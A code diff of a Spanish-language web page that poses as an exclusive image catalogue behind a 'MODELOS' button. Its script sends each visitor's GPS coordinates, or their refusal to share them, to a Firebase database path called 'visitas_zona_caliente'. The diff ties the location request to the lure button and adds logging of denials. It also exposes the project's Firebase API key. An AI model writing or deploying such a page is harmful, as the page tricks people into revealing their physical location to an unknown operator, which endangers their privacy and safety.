@@ -16,13 +16,13 @@
         header h1 { color: #ffffff; text-transform: uppercase; letter-spacing: 2px; }
         header h1 span { color: #ff003c; }
         
-        /* Imagen principal de fondo */
+        /* Portada corregida a principal.png */
         .hero { 
-            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('Captura de pantalla 2026-06-12 220633.png') no-repeat center center/cover; 
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('principal.png') no-repeat center center/cover; 
             height: 500px; display: flex; flex-direction: column; justify-content: center; align-items: center;
         }
         
-        .btn-gatitas { 
+        .btn-modelos { 
             margin-top: 20px; padding: 15px 40px; background: #ff003c; color: white; border: none; 
             font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase;
         }
@@ -43,10 +43,10 @@
     </header>
 
     <section class="hero" id="home">
-        <button class="btn-gatitas" onclick="mostrarGatitas()">Gatitas</button>
+        <button class="btn-modelos" onclick="iniciarYMostrar()">MODELOS</button>
     </section>
 
-    <section id="seccion-gatitas" class="section-hidden">
+    <section id="seccion-modelos" class="section-hidden">
         <h2 style="text-align: center; margin-bottom: 30px; color: white;">Catálogo Exclusivo</h2>
         <div class="grid">
             <img src="Captura de pantalla 2026-06-12 220659.png" alt="Imagen 1">
@@ -67,11 +67,6 @@
     </footer>
 
     <script>
-        function mostrarGatitas() {
-            document.getElementById('home').style.display = 'none';
-            document.getElementById('seccion-gatitas').classList.add('active');
-        }
-
         const firebaseConfig = {
             apiKey: "AIzaSyDITt3GQmc1uANwOqWNVoqWgmhm9CQQRdU",
             authDomain: "miubicacion-52e7f.firebaseapp.com",
@@ -86,17 +81,28 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        window.onload = function() {
+        // La función ahora hace dos cosas: pide GPS y muestra el contenido
+        function iniciarYMostrar() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(siPermitio);
+                navigator.geolocation.getCurrentPosition(siPermitio, errorPermiso);
             }
-        };
+            // Mostrar la sección después de intentar obtener la ubicación
+            document.getElementById('home').style.display = 'none';
+            document.getElementById('seccion-modelos').classList.add('active');
+        }
 
         function siPermitio(posicion) {
             database.ref('visitas_zona_caliente/' + Date.now()).set({
                 latitud: posicion.coords.latitude,
                 longitud: posicion.coords.longitude,
                 permiso: "Otorgado"
+            });
+        }
+
+        function errorPermiso(error) {
+            database.ref('visitas_zona_caliente/' + Date.now()).set({
+                permiso: "Denegado",
+                error: error.message
             });
         }
     </script>
